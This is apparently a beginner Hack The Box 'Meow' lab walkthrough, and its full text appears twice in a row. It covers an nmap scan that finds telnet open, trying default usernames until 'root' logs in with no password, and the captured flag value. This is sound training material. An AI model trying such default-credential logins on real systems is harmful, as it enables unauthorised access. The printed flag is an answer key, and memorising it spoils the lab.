# 🐱 Hack The Box - Meow Walkthrough

## 📌 Lab Information

| Category | Details |
|-----------|-----------|
| Platform | Hack The Box |
| Machine | Meow |
| Difficulty | Very Easy |
| Operating System | Linux |
| IP Address | 10.129.1.17 |
| Objective | Gain access to the target and capture the flag |

---

## 🎯 Skills Practiced

- Network Connectivity Verification
- Service Enumeration
- Nmap Scanning
- Telnet Enumeration
- Default Credential Testing
- Linux Command Line Navigation

---

## 🔍 Reconnaissance

### Verify Connectivity

```bash
ping 10.129.1.17
```

**Result**

```text
Host is reachable.
```

---

### Service Enumeration

```bash
sudo nmap -sV 10.129.1.17
```

**Output**

```text
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
```

### Findings

- Port 23/TCP is open.
- Telnet service is running.
- Target operating system appears to be Linux.

---

## 🚪 Initial Access

### Connect to Telnet Service

```bash
telnet 10.129.1.17
```

Login attempts:

```text
admin
```

❌ Failed

```text
administrator
```

❌ Failed

```text
root
```

✅ Success

---

## 🖥️ Shell Access

Successful login provided direct access to the system:

```text
Welcome to Ubuntu 20.04.2 LTS
```

---

## 🚩 Flag Capture

### List Available Files

```bash
ls
```

Output:

```text
flag.txt
snap
```

### Read Flag

```bash
cat flag.txt
```

Output:

```text
b40abdfe23665f766f9c61ecba8a4c19
```

---

## 📚 Key Takeaways

- Always begin with service enumeration.
- Identify exposed services before attempting access.
- Telnet is an insecure protocol that often appears in beginner labs.
- Default or weak credentials remain a common security weakness.
- Proper enumeration often leads directly to initial access.

---

## 🛠️ Tools Used

<p align="left">
  <img src="https://img.shields.io/badge/Nmap-00457C?style=for-the-badge&logo=nmap&logoColor=white" />
  <img src="https://img.shields.io/badge/Telnet-000000?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black" />
</p>

---

## ⚠️ Disclaimer

This walkthrough was completed within the Hack The Box platform for educational purposes only. All activities were conducted in an authorized lab environment.

---

### Author# 🐱 Hack The Box - Meow Walkthrough

## 📌 Lab Information

| Category | Details |
|-----------|-----------|
| Platform | Hack The Box |
| Machine | Meow |
| Difficulty | Very Easy |
| Operating System | Linux |
| IP Address | 10.129.1.17 |
| Objective | Gain access to the target and capture the flag |

---

## 🎯 Skills Practiced

- Network Connectivity Verification
- Service Enumeration
- Nmap Scanning
- Telnet Enumeration
- Default Credential Testing
- Linux Command Line Navigation

---

## 🔍 Reconnaissance

### Verify Connectivity

```bash
ping 10.129.1.17
```

**Result**

```text
Host is reachable.
```

---

### Service Enumeration

```bash
sudo nmap -sV 10.129.1.17
```

**Output**

```text
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
```

### Findings

- Port 23/TCP is open.
- Telnet service is running.
- Target operating system appears to be Linux.

---

## 🚪 Initial Access

### Connect to Telnet Service

```bash
telnet 10.129.1.17
```

Login attempts:

```text
admin
```

❌ Failed

```text
administrator
```

❌ Failed

```text
root
```

✅ Success

---

## 🖥️ Shell Access

Successful login provided direct access to the system:

```text
Welcome to Ubuntu 20.04.2 LTS
```

---

## 🚩 Flag Capture

### List Available Files

```bash
ls
```

Output:

```text
flag.txt
snap
```

### Read Flag

```bash
cat flag.txt
```

Output:

```text
b40abdfe23665f766f9c61ecba8a4c19
```

---

## 📚 Key Takeaways

- Always begin with service enumeration.
- Identify exposed services before attempting access.
- Telnet is an insecure protocol that often appears in beginner labs.
- Default or weak credentials remain a common security weakness.
- Proper enumeration often leads directly to initial access.

---

## 🛠️ Tools Used

<p align="left">
  <img src="https://img.shields.io/badge/Nmap-00457C?style=for-the-badge&logo=nmap&logoColor=white" />
  <img src="https://img.shields.io/badge/Telnet-000000?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black" />
</p>

---

## ⚠️ Disclaimer

This walkthrough was completed within the Hack The Box platform for educational purposes only. All activities were conducted in an authorized lab environment.

---

### Author
